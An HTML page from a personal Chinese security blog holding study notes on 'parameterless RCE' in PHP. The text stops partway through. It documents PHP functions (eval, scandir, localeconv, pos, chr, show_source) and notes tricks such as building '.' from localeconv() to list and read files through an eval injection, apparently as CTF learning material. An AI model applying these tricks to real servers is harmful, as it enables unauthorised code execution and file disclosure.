@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>无参数RCE | chickenmushroom&#39;s blog</title>
+  <meta name="description" content="一.用到的函数1.preg_replace12345678910111213141516171819202122preg_replace (正则表达式, 替换成, 字符串, 最大替换次数【默认-1，无数次】, 替换次数)收集比较常用的正则字符：[ABC]:匹配[...]里面得字符，例如[ABC]匹配字符串&quot;ABCD&quot;里的ABC字母[^ABC]:匹配除了[...]里面的字符。如上">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无参数RCE">
+<meta property="og:url" content="http://example.com/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一.用到的函数1.preg_replace12345678910111213141516171819202122preg_replace (正则表达式, 替换成, 字符串, 最大替换次数【默认-1，无数次】, 替换次数)收集比较常用的正则字符：[ABC]:匹配[...]里面得字符，例如[ABC]匹配字符串&quot;ABCD&quot;里的ABC字母[^ABC]:匹配除了[...]里面的字符。如上">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912175831311.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912112907731.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912113134307.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200906155734836.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200906155853112.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200906160031122.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912155859696.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912160008187.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912160850720.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912161625637.png">
+<meta property="article:published_time" content="2020-09-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-12T15:42:57.378Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/image-20200912175831311.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">chickenmushroom</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" rel="tag">PHP小项目</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a><span class="tag-list-count">10</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 13px;">PHP小项目</a> <a href="/tags/WriteUp/" style="font-size: 13px;">WriteUp</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 14px;">学习笔记</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/13/hello-world/" class="title">Hello World</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-13T12:47:23.669Z" itemprop="datePublished">2021-11-13</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="title">我TMD烦死了学习笔记</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-01-30T16:00:00.000Z" itemprop="datePublished">2021-01-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/easyphp%E4%B9%8Bcreate_function/" class="title">easyphp之create_function</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/easysql_cat/" class="title">easysql_cat</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/23/%E6%9D%82%E9%A1%B9%EF%BC%88%E4%B8%80%EF%BC%89/" class="title">杂项（一）</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-22T16:00:00.000Z" itemprop="datePublished">2020-12-23</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">一.用到的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-preg-replace"><span class="toc-number">1.1.</span> <span class="toc-text">1.preg_replace</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-eval"><span class="toc-number">1.2.</span> <span class="toc-text">2.eval</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-scandir"><span class="toc-number">1.3.</span> <span class="toc-text">3.scandir()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-localeconv"><span class="toc-number">1.4.</span> <span class="toc-text">4.localeconv()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-pos"><span class="toc-number">1.5.</span> <span class="toc-text">5.pos()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-localtime"><span class="toc-number">1.6.</span> <span class="toc-text">6.localtime()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-char"><span class="toc-number">1.7.</span> <span class="toc-text">7.char()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-show-source%EF%BC%88%EF%BC%89"><span class="toc-number">1.8.</span> <span class="toc-text">8.show_source（）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-strpos"><span class="toc-number">1.9.</span> <span class="toc-text">9.strpos()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%97%A0%E5%8F%82%E6%95%B0RCE%E9%A2%98%E7%9B%AE%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">二、无参数RCE题目问题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-code%E4%BC%A0%E5%8F%82"><span class="toc-number">2.1.</span> <span class="toc-text">1.code传参</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8session%E4%BC%A0%E5%8F%82"><span class="toc-number">2.2.</span> <span class="toc-text">2.利用session传参</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8getallheaders-%E6%9D%A5%E8%8E%B7%E5%8F%96%E5%8F%82%E6%95%B0RCE"><span class="toc-number">2.3.</span> <span class="toc-text">3.利用getallheaders()来获取参数RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E6%83%85%E5%86%B5"><span class="toc-number">2.4.</span> <span class="toc-text">跳转目录情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">2.5.</span> <span class="toc-text">其他小技巧</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">小结</span></a></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-无参数RCE" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      无参数RCE
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="article-date">
+	  <time datetime="2020-09-11T16:00:00.000Z" itemprop="datePublished">2020-09-12</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/09/12/%E6%97%A0%E5%8F%82%E6%95%B0RCE/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h4 id="一-用到的函数"><a href="#一-用到的函数" class="headerlink" title="一.用到的函数"></a>一.用到的函数</h4><h5 id="1-preg-replace"><a href="#1-preg-replace" class="headerlink" title="1.preg_replace"></a>1.preg_replace</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">preg_replace (正则表达式, 替换成, 字符串, 最大替换次数【默认-<span class="number">1</span>，无数次】, 替换次数)</span><br><span class="line">收集比较常用的正则字符：</span><br><span class="line">[ABC]:匹配[...]里面得字符，例如[ABC]匹配字符串<span class="string">&quot;ABCD&quot;</span>里的ABC字母</span><br><span class="line">[^ABC]:匹配除了[...]里面的字符。如上一条相反。</span><br><span class="line">[A-Z]:匹配所有大写字母，小写字母也同理</span><br><span class="line">[\s\S]:匹配所有空白符，包括换行，\S 非空白符，包括换行。</span><br><span class="line">\w:匹配字母、数字、下划线。等价于 [A-Za-z0-<span class="number">9</span>_]</span><br><span class="line">\n:匹配一个换行符。</span><br><span class="line">\s:匹配任何空白字符，包括空格、制表符、换页符等等。</span><br><span class="line">\S:	匹配任何非空白字符。</span><br><span class="line">\f:匹配一个换页符。</span><br><span class="line">\r:匹配一个回车符。</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面是特别字符，使用时要加\，例如：\.</span></span><br><span class="line">$:匹配输入字符串的结尾位置。</span><br><span class="line">*:	匹配前面的子表达式零次或多次。</span><br><span class="line">+:匹配前面的子表达式一次或多次。</span><br><span class="line">.:匹配除换行符 \n 之外的任何单字符。</span><br><span class="line">?:匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。</span><br><span class="line">^:匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。</span><br><span class="line">|:指明两项之间的一个选择。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="2-eval"><a href="#2-eval" class="headerlink" title="2.eval"></a>2.eval</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//eval函数是php里的恶意代码执行，看到eval函数就基本是利用这个eval进行切入。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>()函数可以把字符串按照php代码来计算，但是字符串必须是合法的php代码（不能把结尾的分号漏掉）</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line"><span class="variable">$a</span>=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo<span class="subst">$a</span>;&quot;</span>);</span><br><span class="line">因为没有赋值操作，所以可以不用\来转义$.等同于以下代码：</span><br><span class="line"><span class="variable">$a</span>=<span class="number">100</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo\$a;&quot;</span>)</span><br><span class="line"><span class="comment">//如果参数中带有变量且变量有赋值操作的话，变量前的$符号前一定要有&quot;\&quot;来转义。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-scandir"><a href="#3-scandir" class="headerlink" title="3.scandir()"></a>3.scandir()</h5><p>scandir() 函数返回指定目录中的文件和目录的数组。</p>
+<p>用法：scandir(directory,sorting_order,context);</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>directory</em></td>
+<td align="left">必需。规定要扫描的目录。</td>
+</tr>
+<tr>
+<td align="left"><em>sorting_order</em></td>
+<td align="left">可选。规定排列顺序。默认是 0，表示按字母升序排列。如果设置为 SCANDIR_SORT_DESCENDING 或者 1，则表示按字母降序排列。如果设置为 SCANDIR_SORT_NONE，则返回未排列的结果。</td>
+</tr>
+<tr>
+<td align="left"><em>context</em></td>
+<td align="left">可选。规定目录句柄的环境。<em>context</em> 是可修改目录流的行为的一套选项。</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//列出images目录的文件和目录</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&quot;/images/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以升序排序 - 默认</span></span><br><span class="line"><span class="variable">$a</span> = scandir(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以降序排序</span></span><br><span class="line"><span class="variable">$b</span> = scandir(<span class="variable">$dir</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">print_r(<span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//结果显示</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[<span class="number">0</span>] =&gt; .</span><br><span class="line">[<span class="number">1</span>] =&gt; ..</span><br><span class="line">[<span class="number">2</span>] =&gt; cat.gif</span><br><span class="line">[<span class="number">3</span>] =&gt; dog.gif</span><br><span class="line">[<span class="number">4</span>] =&gt; horse.gif</span><br><span class="line">[<span class="number">5</span>] =&gt; myimages</span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">[<span class="number">0</span>] =&gt; myimages</span><br><span class="line">[<span class="number">1</span>] =&gt; horse.gif</span><br><span class="line">[<span class="number">2</span>] =&gt; dog.gif</span><br><span class="line">[<span class="number">3</span>] =&gt; cat.gif</span><br><span class="line">[<span class="number">4</span>] =&gt; ..</span><br><span class="line">[<span class="number">5</span>] =&gt; .</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<h5 id="4-localeconv"><a href="#4-localeconv" class="headerlink" title="4.localeconv()"></a>4.localeconv()</h5><p>可以用来构造”.”，localeconv() 会返回当地的金融信息的数组，而第一个元素即为点。</p>
+<p>构造方法只需取第一个元素即可<code>pos()、current()</code>均可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(pos(localeconv()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912175831311.png" alt="image-20200912175831311"></p>
+<h5 id="5-pos"><a href="#5-pos" class="headerlink" title="5.pos()"></a>5.pos()</h5><p>pos() 函数是返回数组中的当前元素的值。</p>
+<p>该函数是 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> 函数的别名。</p>
+<p>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p>
+<p><strong>提示：</strong>该函数不会移动数组内部指针。</p>
+<p>相关的方法：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a> - 返回数组中的当前元素的值</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> - 将内部指针指向数组中的最后一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> - 将内部指针指向数组中的下一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> - 将内部指针指向数组中的上一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> - 将内部指针指向数组中的第一个元素，并输出</li>
+<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<h5 id="6-localtime"><a href="#6-localtime" class="headerlink" title="6.localtime()"></a>6.localtime()</h5><p>以数值数组和关联数组的形式输出本地时间：</p>
+<p>因为localtime的第46秒对应的ASCII 值是”.”，所以可以用来构造”.”（和chr（）函数配合使用就可以构造”.”）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(timestamp,is_assoc);</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>timestamp</em></td>
+<td align="left">可选。规定 Unix 时间戳。如果未规定 <em>timestamp</em>，则默认为当前的本地时间 time()。</td>
+</tr>
+<tr>
+<td align="left"><em>is_assoc</em></td>
+<td align="left">可选。规定返回关联数组还是索引数组。如果为 FALSE，则返回索引数组。如果为 TRUE，则返回关联数组。默认为 FALSE。关联数组的键名如下：[tm_sec] - 秒数[tm_min] - 分钟数[tm_hour] - 小时[tm_mday] - 月份中的第几天[tm_mon] - 年份中的第几个月，从 0 开始表示一月份[tm_year] - 年份，从 1900 开始[tm_wday] - 星期中的第几天 (Sunday=0)[tm_yday] - 年中的第几天[tm_isdst] - 夏令时当前是否生效</td>
+</tr>
+</tbody></table>
+<h5 id="7-char"><a href="#7-char" class="headerlink" title="7.char()"></a>7.char()</h5><p>chr() 函数从指定的 ASCII 值返回字符。</p>
+<p>ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 十进制</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">061</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 八进制值</span></span><br><span class="line"><span class="keyword">echo</span> chr(<span class="number">0x61</span>) . <span class="string">&quot;&lt;br&gt;&quot;</span>; <span class="comment">// 十六进制值</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="8-show-source（）"><a href="#8-show-source（）" class="headerlink" title="8.show_source（）"></a>8.show_source（）</h5><p>对文件进行语法高亮显示。</p>
+<p>本函数是 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_misc_highlight_file.asp">highlight_file()</a> 的别名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(filename,return)</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">filename</td>
+<td align="left">必需。要进行高亮处理的 PHP 文件的路径。</td>
+</tr>
+<tr>
+<td align="left">return</td>
+<td align="left">可选。如果设置 true，则本函数返回高亮处理的代码。</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;1.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20200912112907731.png" alt="image-20200912112907731"></p>
+<h5 id="9-strpos"><a href="#9-strpos" class="headerlink" title="9.strpos()"></a>9.strpos()</h5><p>查找字符串在另一字符串中第一次出现的位置。此函数对大小写敏感</p>
